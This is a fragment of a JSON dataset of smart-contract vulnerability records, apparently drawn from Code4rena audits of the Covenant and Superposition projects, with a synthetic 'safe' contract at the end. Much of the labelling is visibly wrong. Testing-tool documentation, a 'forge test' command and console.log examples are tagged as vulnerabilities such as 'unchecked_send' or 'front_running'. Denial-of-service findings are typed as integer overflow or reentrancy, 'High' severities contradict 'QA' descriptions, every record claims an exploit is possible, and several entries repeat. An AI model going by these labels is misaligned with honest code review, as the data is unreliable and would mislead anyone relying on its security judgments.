    "description": "Some of the cargo tests have optional logging, which might help with debugging. To see these logs, enable the `testing-dbg-<test>` feature and run the tests without capturing stdout, ie `cargo test --features=testing,testing-dbg-erc20 -- --nocapture`. Testing tools are available with the `with_storage` macro, which lets you set slots and",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 2,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.062,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "bash\nforge test --match-test submissionValidity -vvv\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "PoC",
    "description": "A dedicated `C4PoC.t.sol` test file exists in the `test/poc` subfolder of the codebase with a single test suite that can be executed with the following command: forge test --match-test submissionValidity -vvv **For any submission to be accepted as valid by wardens who must provide a PoC, the test must execute successfully and must not mock any contract-initiated calls**.",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.053,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\n// Inherit the stdCheats\ncontract StdCheatsTest is Test {\n    Bar test;\n    function setUp() public {\n        test = new Bar();\n    }\n\n    function testHoax() public {\n        // we call `hoax`, which gives the target address\n        // eth and then calls `prank`\n        hoax(address(1337));\n        test.bar{value: 100}(address(1337));\n\n        // overloaded to allow you to specify how much eth to\n        // initialize the address with\n        hoax(address(1337), 1);\n        test.bar{value: 1}(address(1337));\n    }\n\n    function testStartHoax() public {\n        // we call `startHoax`, which gives the target address\n        // eth and then calls `startPrank`\n        //\n        // it is also overloaded so that you can specify an eth amount\n        startHoax(address(1337));\n        test.bar{value: 100}(address(1337));\n        test.bar{value: 100}(address(1337));\n        vm.stopPrank();\n        test.bar(address(this));\n    }\n}\n\ncontract Bar {\n    function bar(address expectedSender) public payable {\n        require(msg.sender == expectedSender, \"!prank\");\n    }\n}",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Example usage:",
    "description": "// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import \"forge-std/Test.sol\"; // Inherit the stdCheats contract StdCheatsTest is Test {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 43,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n// import it indirectly via Test.sol\nimport \"forge-std/Test.sol\";\n// or directly import it\nimport \"forge-std/console2.sol\";\n...\nconsole2.log(someValue);\n",
    "vulnerability_label": 1,
    "vulnerability_type": "front_running",
    "severity": "Low",
    "title": "`console.log`",
    "description": "Usage follows the same format as [Hardhat](https://hardhat.org/hardhat-network/reference/#console-log). It's recommended to use `console2.sol` as shown below, as this will show the decoded logs in Forge traces. // import it indirectly via Test.sol import \"forge-std/Test.sol\"; // or directly import it",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.162,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "bash\nforge test --match-test submissionValidity -vvv\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "PoC",
    "description": "A dedicated `C4PoC.t.sol` test file exists in the `test/poc` subfolder of the codebase with a single test suite that can be executed with the following command: forge test --match-test submissionValidity -vvv **For any submission to be accepted as valid by wardens who must provide a PoC, the test must execute successfully and must not mock any contract-initiated calls**.",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.053,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "PythOracle (via EulerPythOracle)",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Low",
    "title": "Use of getPriceUnsafe Bypasses Pyth's Integrity Checks",
    "description": "**Severity:** Low **Affected Contract(s):** - `PythOracle (via EulerPythOracle)` **Affected Function(s):** - `_previewFetchPriceStruct()`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.032,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "accrueInterestLnRate()",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "Denial-of-Service via int256.min Negation Overflow in accrueInterestLnRate",
    "description": "**Severity:** QA **Affected Contract(s):** - `DebtMath` **Affected Function(s):** - `accrueInterestLnRate()`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.022,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "calculateLinearAccrual()",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "Arithmetic Overflow Vulnerabilities in DebtMath",
    "description": "**Severity:** QA **Affected Contract(s):** - `DebtMath` **Affected Function(s):** - `accrueInterestLnRate()`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.024,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "govSetResolvedVault & resolveOracle()",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "High",
    "title": "Unbounded Recursive Vault Resolution Leading to Denial-of-Service",
    "description": "**Severity:** QA **Affected Contract(s):** - `CovenantCurator` **Affected Function(s):** - `resolveOracle()`",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.037,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "govSetConfig / govSetFallbackOracle()",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "Owner-Controlled Oracle Configuration Without Validation or Delay",
    "description": "**Severity:** QA **Affected Contract(s):** - `CovenantCurator` **Affected Function(s):** - `govSetConfig()`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.037,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "govSetResolvedVault()",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "Unguarded External Vault.asset() Call in govSetResolvedVault Leading to Admin Denial-of-Service",
    "description": "**Severity:** QA **Affected Contract(s):** - `CovenantCurator` **Affected Function(s):** - `govSetResolvedVault()`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.021,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "govSetFallbackOracle()",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "High",
    "title": "Owner-Controlled Oracle Configuration Without Validation Enables Fund Drain and Denial-of-Service",
    "description": "**Severity:** QA **Affected Contract(s):** - `CovenantCurator` **Affected Function(s):** - `updatePriceFeeds()`",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.022,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "setDefaultPauseAddress()",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "Missing Pause Authority Validation Enables Permanent Pause-Functionality Denial",
    "description": "**Severity:** QA **Affected Contract(s):** - `Covenant` **Affected Function(s):** - `setMarketPauseAddress()`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.024,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "_calculateMarketState (via _readBasePriceAndCalculateLiqRatio)()",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "Unprotected External Oracle Calls in LatentSwapLEX and LatentSwapLogic Leading to Reentrancy and Denial-of-Service",
    "description": "**Severity:** QA **Affected Contract(s):** - `LatentSwapLEX` - `LatentSwapLogic` **Affected Function(s):**",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.064,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "setDefaultNoCapLimit()",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Unbounded Owner-Controlled No-Cap Limit Configuration in LatentSwapLEX",
    "description": "**Severity:** QA **Affected Contract(s):** - `LatentSwapLEX` **Affected Function(s):** - `setDefaultNoCapLimit()`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.022,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "setQuoteTokenSymbolOverrideForNewMarkets()",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Missing Input Validation in Admin-Controlled Configuration Functions",
    "description": "**Severity:** QA **Affected Contract(s):** - `Covenant` - `SpotMarketFactory` - `LatentSwapLEX`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.042,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "_tryStringOrBytes32()",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "Unchecked and Unbounded ABI Decoding in SafeMetadata Leading to Panic and Denial-of-Service",
    "description": "**Severity:** QA **Affected Contract(s):** - `SafeMetadata` - `TokenData` **Affected Function(s):**",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.021,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "getMarketStateFromLiquidityAndDebt()",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "Unbounded Arithmetic in SqrtPriceMath Leads to Denial-of-Service",
    "description": "**Severity:** QA **Affected Contract(s):** - `LatentMath` - `SqrtPriceMath` **Affected Function(s):**",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.036,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "months = debtDuration / 30 days",
    "vulnerability_label": 1,
    "vulnerability_type": "logic_error",
    "severity": "Low",
    "title": "Off-by-One Duration Labeling Bug",
    "description": "**Severity:** QA **Affected Contract(s):** - `LatentSwapLogic` **Affected Function(s):** - `getInitMarketInfo()`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.031,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "if (updatedAmount_ == 0 && _amount > 0) updatedAmount_ = 1",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "Perpetual Dust from Explicit Clamp in Negative-Interest Debt Decay",
    "description": "**Severity:** QA **Affected Contract(s):** - `DebtMath` **Affected Function(s):** - `accrueInterestLnRate()`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.058,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "setDefaultPauseAddress()",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Zero Default Pause Address Leads to Unpauseable Markets",
    "description": "**Severity:** QA **Affected Contract(s):** - `Covenant` **Affected Function(s):** - `setDefaultPauseAddress()`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.024,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "collectProtocolFee()",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Zero-amount Protocol Fee Collection Allowed",
    "description": "**Severity:** QA **Affected Contract(s):** - `Covenant` **Affected Function(s):** - `collectProtocolFee()`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.02,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "_readBasePriceAndCalculateLiqRatio / readBasePriceAndCalculateLiqRatio()",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "Unchecked Division Operations Across LatentSwapLogic and LatentMath Leading to Denial-of-Service",
    "description": "**Severity:** QA **Affected Contract(s):** - `LatentMath` - `LatentSwapLogic` **Affected Function(s):**",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.072,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "calculateApproxExponentialUpdate()",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "Unchecked Duration Parameter Leads to Denial-of-Service in DebtMath",
    "description": "**Severity:** QA **Affected Contract(s):** - `DebtMath` **Affected Function(s):** - `calculateApproxExponentialUpdate()`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.034,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "saturatingMulDiv(uint256 x, uint256 y, uint256 denominator, Math.Rounding rounding)()",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "Missing Zero-Denominator and Input Bounds Checks Across Multiple Math Modules Leading to Denial-of-Service",
    "description": "**Severity:** QA **Affected Contract(s):** - `Various Adapters (e.g., UniswapV3Adapter)` - `SaturatingMath` - `LatentSwapLogic`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.085,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "_calculateMarketState()",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Miner/Validator Bias and Non-Determinism in Protocol Fee Rounding",
    "description": "**Severity:** QA **Affected Contract(s):** - `LatentSwapLogic` - `LatentSwapLEX` **Affected Function(s):**",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.023,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "_previewFetchPriceStruct()",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Low",
    "title": "Miner Manipulation of Timestamp-based Validation",
    "description": "**Severity:** QA **Affected Contract(s):** - `PythOracle` **Affected Function(s):** - `_previewFetchPriceStruct()`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.026,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "_calculateMarketState()",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "High",
    "title": "Unchecked Numeric Casts Leading to Wrap-Around and DoS",
    "description": "**Severity:** QA **Affected Contract(s):** - `LatentSwapLEX` - `DebtMath` - `LatentSwapLogic`",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.023,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "_readBasePriceAndCalculateLiqRatio()",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "Unbounded scaleDecimals Causes Exponentiation Overflow in `_readBasePriceAndCalculateLiqRatio`",
    "description": "**Severity:** QA **Affected Contract(s):** - `LatentSwapLogic` **Affected Function(s):** - `_readBasePriceAndCalculateLiqRatio()`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.036,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "accrueInterestLnRate()",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "Asymmetric Rounding in accrueInterestLnRate",
    "description": "**Severity:** QA **Affected Contract(s):** - `DebtMath` **Affected Function(s):** - `accrueInterestLnRate()`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.022,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "_readBasePriceAndCalculateLiqRatio()",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "Exponentiation Overflow Leading to DOS",
    "description": "**Severity:** QA **Affected Contract(s):** - `LatentSwapLogic` **Affected Function(s):** - `_readBasePriceAndCalculateLiqRatio()`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.036,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "_tryStringOrBytes32()",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Potential Denial of Service via Malformed Dynamic String",
    "description": "**Severity:** QA **Affected Contract(s):** - `SafeMetadata` **Affected Function(s):** - `_tryStringOrBytes32()`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.021,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "amountOut.percentMul(PERCENTAGE_FACTOR - swapFee)",
    "vulnerability_label": 1,
    "vulnerability_type": "logic_error",
    "severity": "Low",
    "title": "Missing Swap Fee on Full and Undercollateralized Redemptions",
    "description": "**Severity:** QA **Affected Contract(s):** - `LatentSwapLogic` **Affected Function(s):** - `_calcRedeem()`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.049,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "_synthToDex(..., Rounding.Ceil)",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "Compounded Upward Rounding Bias in _calcRatio",
    "description": "**Severity:** QA **Affected Contract(s):** - `LatentSwapLogic` **Affected Function(s):** - `_calcRatio()`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.031,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "_calculateTokenPrices()",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "Low",
    "title": "Upward Bias and Non-Reciprocity Due to Consecutive Ceiling Rounding",
    "description": "**Severity:** QA **Affected Contract(s):** - `LatentSwapLogic` **Affected Function(s):** - `_calculateTokenPrices()`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.023,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\n// Inherit the stdCheats\ncontract StdCheatsTest is Test {\n    Bar test;\n    function setUp() public {\n        test = new Bar();\n    }\n\n    function testHoax() public {\n        // we call `hoax`, which gives the target address\n        // eth and then calls `prank`\n        hoax(address(1337));\n        test.bar{value: 100}(address(1337));\n\n        // overloaded to allow you to specify how much eth to\n        // initialize the address with\n        hoax(address(1337), 1);\n        test.bar{value: 1}(address(1337));\n    }\n\n    function testStartHoax() public {\n        // we call `startHoax`, which gives the target address\n        // eth and then calls `startPrank`\n        //\n        // it is also overloaded so that you can specify an eth amount\n        startHoax(address(1337));\n        test.bar{value: 100}(address(1337));\n        test.bar{value: 100}(address(1337));\n        vm.stopPrank();\n        test.bar(address(this));\n    }\n}\n\ncontract Bar {\n    function bar(address expectedSender) public payable {\n        require(msg.sender == expectedSender, \"!prank\");\n    }\n}",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Example usage:",
    "description": "// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import \"forge-std/Test.sol\"; // Inherit the stdCheats contract StdCheatsTest is Test {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 43,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n// import it indirectly via Test.sol\nimport \"forge-std/Test.sol\";\n// or directly import it\nimport \"forge-std/console2.sol\";\n...\nconsole2.log(someValue);\n",
    "vulnerability_label": 1,
    "vulnerability_type": "front_running",
    "severity": "Low",
    "title": "`console.log`",
    "description": "Usage follows the same format as [Hardhat](https://hardhat.org/hardhat-network/reference/#console-log). It's recommended to use `console2.sol` as shown below, as this will show the decoded logs in Forge traces. // import it indirectly via Test.sol import \"forge-std/Test.sol\"; // or directly import it",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-covenant",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.162,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 1",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
